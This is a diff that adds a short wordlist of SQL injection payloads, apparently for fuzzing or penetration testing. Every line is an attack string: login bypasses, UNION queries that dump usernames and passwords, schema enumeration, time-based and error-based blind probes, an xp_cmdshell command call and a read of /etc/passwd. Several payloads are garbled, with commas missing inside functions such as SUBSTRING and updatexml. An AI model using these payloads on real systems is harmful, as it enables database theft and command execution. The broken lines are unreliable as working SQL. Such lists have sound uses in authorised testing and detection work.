@@ -1,0 +1,26 @@
+1 OR 1=1
+' OR '1'='1'--
+' UNION SELECT NULLNULL--
+' UNION SELECT username password FROM users--
+admin' --
+admin' #
+admin'/*
+' OR 1=1#
+' OR 'x'='x
+1 AND 1=2
+1 UNION ALL SELECT NULLNULLNULL--
+1' AND SLEEP(5)--
+1' AND pg_sleep(5)--
+1 WAITFOR DELAY '00:00:05'--
+' OR EXISTS(SELECT * FROM users)--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+1; EXEC xp_cmdshell('whoami')--
+1; SELECT load_file('/etc/passwd')--
+' UNION SELECT 1database()user()--
+admin' AND 1=(SELECT COUNT(*) FROM tablename)--
+' AND ASCII(SUBSTRING((SELECT database())11))>77--
+' OR updatexml(1concat(0x7e(SELECT database()))0)--
+' OR extractvalue(1concat(0x7e(SELECT user())))--
+1;SELECT+PG_SLEEP(5)
+' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--
